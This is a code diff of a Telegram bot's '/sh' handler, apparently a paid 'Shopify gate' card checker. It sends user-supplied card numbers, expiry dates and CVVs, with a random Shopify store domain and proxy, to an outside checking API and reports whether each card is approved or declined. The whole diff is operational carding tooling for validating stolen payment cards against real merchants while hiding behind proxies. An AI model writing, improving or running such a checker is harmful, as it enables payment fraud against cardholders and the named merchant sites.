@@ -10,26 +10,28 @@ from telegram.ext import CommandHandler, ContextTypes
 from config import (
     get_bin_info, kb_result, OWNER_ID, FORCE_CHANNELS,
     SUPPORT_LINK, API_TIMEOUT, E_LIVE, E_DECLINED, E_ERRORS,
-    E_GATE, E_CARD, E_USER, E_TIME
+    E_GATE, E_CARD, E_USER, E_TIME,
 )
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# 🛒 SHOPIFY API  (goshopi.up.railway.app)
+# 🛒  REAL SHOPIFY API
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 SHOPII_API = "https://goshopi.up.railway.app/shopii"
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# LOADERS  (sites.txt / px.txt)
+# 📂  LOADERS  (sites.txt  /  px.txt)
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 def _clean_site(raw: str) -> str:
-    """Strip protocol, www, trailing slashes — API needs plain domain only."""
-    s = raw.strip().lower()
+    """Strip protocol / www / trailing slashes — API needs bare domain."""
+    s = raw.strip()
     for prefix in ("https://", "http://", "www."):
-        if s.startswith(prefix):
+        if s.lower().startswith(prefix):
             s = s[len(prefix):]
-    return s.rstrip("/")
+    return s.rstrip("/").strip()
+
 
 def load_sites() -> list[str]:
+    """Load Shopify target sites from sites.txt (one domain per line)."""
     try:
         with open("sites.txt") as f:
             sites = [_clean_site(l) for l in f if l.strip() and not l.startswith("#")]
@@ -37,20 +39,28 @@ def load_sites() -> list[str]:
             return sites
     except FileNotFoundError:
         pass
-    return ["1898-products.myshopify.com", "anotherseasonwaco.myshopify.com"]
+    # Hard-coded fallbacks — replace these with real sites in sites.txt
+    return [
+        "1898-products.myshopify.com",
+        "anotherseasonwaco.myshopify.com",
+    ]
+
 
 def load_proxies() -> list[str]:
+    """Load proxies from px.txt (one per line, any format)."""
     try:
         with open("px.txt") as f:
             return [l.strip() for l in f if l.strip() and not l.startswith("#")]
     except FileNotFoundError:
         return []
 
+
+# Loaded once at import time
 SITES   = load_sites()
 PROXIES = load_proxies()
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# USER DATA
+# 👤  USER HELPERS
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 def get_user_data(user_id: int, context: ContextTypes.DEFAULT_TYPE) -> dict:
     uid = str(user_id)
@@ -63,6 +73,7 @@ def get_user_data(user_id: int, context: ContextTypes.DEFAULT_TYPE) -> dict:
         }
     return context.bot_data["user_data"][uid]
 
+
 def is_user_premium(ud: dict) -> bool:
     if ud.get("plan", "TRIAL").upper() == "TRIAL":
         return False
@@ -71,8 +82,14 @@ def is_user_premium(ud: dict) -> bool:
         return False
     return True
 
+
 def get_styled_plan(raw: str) -> str:
-    return {"CORE": "✨ Cᴏʀᴇ ✨", "ELITE": "⭐ Eʟɪᴛᴇ ⭐", "ROOT": "👑 Rᴏᴏᴛ 👑"}.get(raw.upper(), "Tʀɪᴀʟ")
+    return {
+        "CORE":  "✨ Cᴏʀᴇ ✨",
+        "ELITE": "⭐ Eʟɪᴛᴇ ⭐",
+        "ROOT":  "👑 Rᴏᴏᴛ 👑",
+    }.get(raw.upper(), "Tʀɪᴀʟ")
+
 
 async def _check_force_sub(user_id: int, context) -> list:
     if user_id == OWNER_ID:
@@ -87,17 +104,19 @@ async def _check_force_sub(user_id: int, context) -> list:
             pass
     return not_joined
 
+
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# REAL API CALL — never returns fast, waits for goshopi
+# 🌐  GOSHOPI API CALL
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 async def call_shopii(cc: str, month: str, year: str, cvv: str,
                       site: str, proxy: str | None) -> str:
     """
-    Hits the real goshopi API and returns the raw response string
-    exactly as received. Never modifies, filters, or truncates it.
-    Raises on network failure so caller can show the real error.
+    GET goshopi.up.railway.app/shopii?cc=NUM|MM|YYYY|CVV&site=DOMAIN[&proxy=...]
+
+    Returns the FULL raw API response string — never modified, never filtered.
+    Raises on network error so the caller can show the real problem.
     """
-    # API requires full 4-digit year
+    # API requires 4-digit year
     if len(year) == 2:
         year = "20" + year
 
@@ -109,7 +128,7 @@ async def call_shopii(cc: str, month: str, year: str, cvv: str,
         params["proxy"] = proxy
 
     timeout = aiohttp.ClientTimeout(
-        total=API_TIMEOUT,    # 120 s from config — enough for real Shopify checkout
+        total=API_TIMEOUT,      # 120 s from config.py
         connect=15,
         sock_read=API_TIMEOUT,
     )
@@ -127,11 +146,10 @@ async def call_shopii(cc: str, month: str, year: str, cvv: str,
         timeout=timeout, headers=headers, connector=connector
     ) as session:
         async with session.get(SHOPII_API, params=params) as resp:
-            # Read FULL body — never cut short
             raw_bytes = await resp.read()
             raw_text  = raw_bytes.decode("utf-8", errors="replace").strip()
 
-            # Pretty-print JSON if valid, otherwise keep raw string
+            # Pretty-print if JSON, keep raw string otherwise
             try:
                 parsed   = json.loads(raw_text)
                 raw_text = json.dumps(parsed, ensure_ascii=False, separators=(",", ":"))
@@ -141,12 +159,30 @@ async def call_shopii(cc: str, month: str, year: str, cvv: str,
     return raw_text
 
 
-def classify(raw: str) -> str:
+def _readable_resp(raw: str) -> str:
     """
-    Returns "APPROVED" / "DECLINED" / "UNKNOWN".
-    Only reads what the API actually said — never assumes.
+    Pull the human-readable message from the API JSON.
+    Falls back to the full raw string if it's not JSON
+    or none of the known keys exist.
     """
-    t = raw.lower()
+    try:
+        d = json.loads(raw)
+        for key in ("value", "message", "Response", "response",
+                    "category", "status", "msg", "detail", "error"):
+            if key in d and d[key] not in (None, "", False):
+                return str(d[key]).strip()
+        # If no known key found, return full compact JSON
+        return raw
+    except Exception:
+        return raw
+
+
+def classify(resp_text: str) -> str:
+    """
+    "APPROVED" / "DECLINED" / "UNKNOWN"
+    Only reads what the API actually returned — never assumes.
+    """
+    t = resp_text.lower()
     for kw in ("approved", "approval", "success", "charged", "captured",
                "payment approved", "transaction approved", "paid"):
         if kw in t:
@@ -154,27 +190,31 @@ def classify(raw: str) -> str:
     for kw in ("declined", "decline", "failed", "failure", "invalid",
                "do not honor", "do_not_honor", "card_declined",
                "generic_decline", "insufficient", "expired",
-               "incorrect_cvc", "stolen", "blocked", "error"):
+               "incorrect_cvc", "stolen", "blocked"):
         if kw in t:
             return "DECLINED"
     return "UNKNOWN"
 
+
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# /sh HANDLER
+# /sh  COMMAND HANDLER
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 async def cmd_sh(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
 
+    # Maintenance
     if context.bot_data.get("maintenance") and user.id != OWNER_ID:
         await update.message.reply_text("⚠️ Bot is under maintenance. Try again later.")
         return
 
+    # Gate toggle
     if not context.bot_data.get("sh_on", True):
         await update.message.reply_text(
-            "⚠️ Sʜᴏᴘɪꜰʏ gate is currently <b>OFF</b>.", parse_mode="HTML"
+            f"{E_DECLINED} Sʜᴏᴘɪꜰʏ gate is currently <b>OFF</b>.", parse_mode="HTML"
         )
         return
 
+    # Force-join
     not_joined = await _check_force_sub(user.id, context)
     if not_joined:
         rows = [[InlineKeyboardButton(f"➺ Join @{n}", url=l)] for n, l in not_joined]
@@ -188,7 +228,7 @@ async def cmd_sh(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         return
 
-    # ── Parse card ──
+    # ── Parse card ──────────────────────────────────────
     card_str = None
     if context.args:
         card_str = context.args[0].strip()
@@ -200,15 +240,11 @@ async def cmd_sh(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         if m:
             card_str = f"{m.group(1)}|{m.group(2)}|{m.group(3)}|{m.group(4)}"
-        else:
-            m2 = re.search(r'\b(\d{13,19})\b', rt)
-            if m2:
-                card_str = m2.group(1)
 
     if not card_str:
         await update.message.reply_text(
-            "⚠️ <b>Uꜱᴀɢᴇ:</b>\n<code>/sh cc|mm|yy|cvv</code>\n\n"
-            "<b>Example:</b>\n<code>/sh 4111111111111111|12|26|123</code>",
+            f"{E_ERRORS} <b>Uꜱᴀɢᴇ:</b>  <code>/sh cc|mm|yy|cvv</code>\n"
+            "<b>Example:</b>  <code>/sh 4111111111111111|12|26|123</code>",
             parse_mode="HTML",
         )
         return
@@ -216,13 +252,13 @@ async def cmd_sh(update: Update, context: ContextTypes.DEFAULT_TYPE):
     parts = card_str.split("|")
     if len(parts) != 4:
         await update.message.reply_text(
-            "❌ Invalid format. Use: <code>cc|mm|yy|cvv</code>", parse_mode="HTML"
+            f"{E_ERRORS} Invalid format — use <code>cc|mm|yy|cvv</code>", parse_mode="HTML"
         )
         return
 
-    cc_num, mm, yy, cvv = [p.strip() for p in parts]
+    cc_num, mm, yy, cvv_val = [p.strip() for p in parts]
 
-    # ── Credits ──
+    # ── Credits ──────────────────────────────────────────
     ud      = get_user_data(user.id, context)
     premium = is_user_premium(ud)
 
@@ -231,8 +267,7 @@ async def cmd_sh(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await update.message.reply_text(
                 "<b>[ 𖥷iТ ] ➺ Nᴏ Cʀᴇᴅɪᴛꜱ ❌</b>\n"
                 "━━━━━━━━━━━━━━━━━\n"
-                "You have no credits left.\n"
-                "Redeem a code with /rm or buy a plan.\n"
+                "You have 0 credits. Redeem with /rm or upgrade.\n"
                 "━━━━━━━━━━━━━━━━━",
                 parse_mode="HTML",
                 reply_markup=InlineKeyboardMarkup([
@@ -243,22 +278,24 @@ async def cmd_sh(update: Update, context: ContextTypes.DEFAULT_TYPE):
             return
         ud["credits"] -= 1
 
+    # ── Pick site + proxy ────────────────────────────────
     site_used  = random.choice(SITES)
-    proxy      = random.choice(PROXIES) if PROXIES else None
+    proxy_used = random.choice(PROXIES) if PROXIES else None
     start_time = time.time()
     bin_num    = cc_num[:6]
 
     msg = await update.message.reply_text(
         f"{E_GATE} <b>[ 𖥷iТ ] ➺ Cʜᴇᴄᴋɪɴɢ Sʜᴏᴘɪꜰʏ...</b>\n"
+        f"━━━━━━━━━━━━━━━━━\n"
         f"🌐 <code>{escape(site_used)}</code>\n"
-        f"⏳ Hitting real API — please wait...",
+        f"⏳ Waiting for real API response...",
         parse_mode="HTML",
     )
 
+    # ── Parallel: API + BIN lookup ───────────────────────
     try:
-        # API call + BIN lookup run at the same time
         api_task = asyncio.create_task(
-            call_shopii(cc_num, mm, yy, cvv, site_used, proxy)
+            call_shopii(cc_num, mm, yy, cvv_val, site_used, proxy_used)
         )
         bin_task = asyncio.create_task(get_bin_info(bin_num))
 
@@ -266,14 +303,14 @@ async def cmd_sh(update: Update, context: ContextTypes.DEFAULT_TYPE):
         api_result = results[0]
         bin_data   = results[1] if not isinstance(results[1], Exception) else {"error": True}
 
-        # If API itself threw an exception, re-raise it
         if isinstance(api_result, Exception):
             raise api_result
 
-        raw_response = api_result   # full, real, unmodified API text
+        raw_response = api_result                        # full, real, unmodified
+        display_resp = _readable_resp(raw_response)      # human-readable extracted field
+        status       = classify(display_resp)
 
-        # Classify purely from API words
-        status = classify(raw_response)
+        # Status label
         if status == "APPROVED":
             status_ui = f"{E_LIVE} Aᴘᴘʀᴏᴠᴇᴅ ✅"
         elif status == "DECLINED":
@@ -281,38 +318,38 @@ async def cmd_sh(update: Update, context: ContextTypes.DEFAULT_TYPE):
         else:
             status_ui = f"{E_ERRORS} Uɴᴋɴᴏᴡɴ ⚠️"
 
-        # BIN display
+        # BIN
         bin_txt = "N/A"
         country = "N/A"
         flag    = ""
         if not bin_data.get("error"):
-            s       = str(bin_data.get("scheme",  "")).upper() or "N/A"
-            t       = str(bin_data.get("type",    "")).upper() or "N/A"
+            s       = str(bin_data.get("scheme", "")).upper() or "N/A"
+            t       = str(bin_data.get("type",   "")).upper() or "N/A"
             b       = bin_data.get("bank", "N/A")
-            country = str(bin_data.get("country", "N/A")).upper()
+            country = str(bin_data.get("country", "N/A"))
             flag    = bin_data.get("country_emoji", "")
             bin_txt = f"{s} - {t} - {b}"
 
         time_taken = f"{time.time() - start_time:.2f}"
         plan_ui    = get_styled_plan(ud.get("plan", "TRIAL"))
         username   = escape(user.first_name or "User")
-        safe_resp  = escape(raw_response)   # full real API response, HTML-safe
-        safe_proxy = escape(proxy or "None")
+        safe_resp  = escape(display_resp[:400])
+        safe_proxy = escape(proxy_used or "None")
 
         text = (
             f"<b>[ 𖥷iТ ] ➺ {status_ui}</b>\n"
             f"{E_CARD} ➺ <code>{escape(card_str)}</code>\n"
-            f"{E_GATE} Gᴀᴛᴇ ➺ Sʜᴏᴘɪꜰʏ 🛒\n"
+            f"{E_GATE} Gᴀᴛᴇ ➺ Sʜᴏᴘɪꜰʏ Cʜᴀʀɢᴇ | 0$\n"
             f"━━━━━━━━━━━━━━━━━\n"
-            f"🌐 𝗦𝗜𝗧𝗘  ➺ <code>{escape(site_used)}</code>\n"
-            f"🔒 𝗣𝗥𝗢𝗫𝗬 ➺ <code>{safe_proxy}</code>\n"
-            f"📜 𝗥𝗘𝗦𝗣  ➺ <code>{safe_resp}</code>\n"
-            f"{E_TIME} 𝗧𝗜𝗠𝗘  ➺ {time_taken}s\n"
+            f"🌐 𝗦𝗜𝗧𝗘  ➳ <code>{escape(site_used)}</code>\n"
+            f"🔒 𝗣𝗥𝗢𝗫𝗬 ➳ <code>{safe_proxy}</code>\n"
+            f"📜 𝗥𝗘𝗦𝗣  ➳ {safe_resp}\n"
+            f"{E_TIME} 𝗧𝗜𝗠𝗘  ➳ {time_taken}s\n"
             f"━━━━━━━━━━━━━━━━━\n"
-            f"🏦 𝗕𝗜𝗡    ➺ {bin_txt}\n"
-            f"🌍 𝗖𝗢𝗨𝗡𝗧𝗥𝗬 ➺ {flag} {country}\n"
+            f"🏦 𝗜𝗡𝗙𝗢   ➳ {bin_txt}\n"
+            f"🌍 𝗖𝗢𝗨𝗡𝗧𝗥𝗬 ➳ {flag} {country}\n"
             f"━━━━━━━━━━━━━━━━━\n"
-            f"{E_USER} 𝗨𝘀𝗲𝗿  ➺ {username} ({plan_ui})\n"
+            f"{E_USER} ➳ {username} ({plan_ui})\n"
             f"📢 @Batcardchk"
         )
 
@@ -328,9 +365,8 @@ async def cmd_sh(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await msg.edit_text(
             f"{E_ERRORS} <b>[ 𖥷iТ ] ➺ Tɪᴍᴇᴏᴜᴛ ❌</b>\n"
             f"━━━━━━━━━━━━━━━━━\n"
-            f"🌐 Site: <code>{escape(site_used)}</code>\n"
-            f"⏱️ Waited {API_TIMEOUT}s — site did not respond.\n"
-            f"Try again or change the site in sites.txt\n"
+            f"🌐 <code>{escape(site_used)}</code>\n"
+            f"⏱️ No response after {API_TIMEOUT}s. Try again.\n"
             f"━━━━━━━━━━━━━━━━━",
             parse_mode="HTML",
         )
@@ -339,9 +375,9 @@ async def cmd_sh(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if not premium:
             ud["credits"] = ud.get("credits", 0) + 1
         await msg.edit_text(
-            f"{E_ERRORS} <b>[ 𖥷iТ ] ➺ Cᴏɴɴᴇᴄᴛɪᴏɴ Fᴀɪʟᴇᴅ ❌</b>\n"
+            f"{E_ERRORS} <b>[ 𖥷iТ ] ➺ Cᴏɴɴᴇᴄᴛɪᴏɴ Eʀʀᴏʀ ❌</b>\n"
             f"━━━━━━━━━━━━━━━━━\n"
-            f"<code>{escape(str(e)[:250])}</code>\n"
+            f"<code>{escape(str(e)[:300])}</code>\n"
             f"━━━━━━━━━━━━━━━━━",
             parse_mode="HTML",
         )
@@ -349,12 +385,11 @@ async def cmd_sh(update: Update, context: ContextTypes.DEFAULT_TYPE):
     except Exception as e:
         if not premium:
             ud["credits"] = ud.get("credits", 0) + 1
-        # Show the exact error type and detail — never hide what went wrong
         await msg.edit_text(
             f"{E_ERRORS} <b>[ 𖥷iТ ] ➺ Eʀʀᴏʀ ❌</b>\n"
             f"━━━━━━━━━━━━━━━━━\n"
-            f"<b>Type:</b> <code>{escape(type(e).__name__)}</code>\n"
-            f"<b>Detail:</b> <code>{escape(str(e)[:250])}</code>\n"
+            f"<b>Type:</b>   <code>{escape(type(e).__name__)}</code>\n"
+            f"<b>Detail:</b> <code>{escape(str(e)[:300])}</code>\n"
             f"━━━━━━━━━━━━━━━━━",
             parse_mode="HTML",
         )
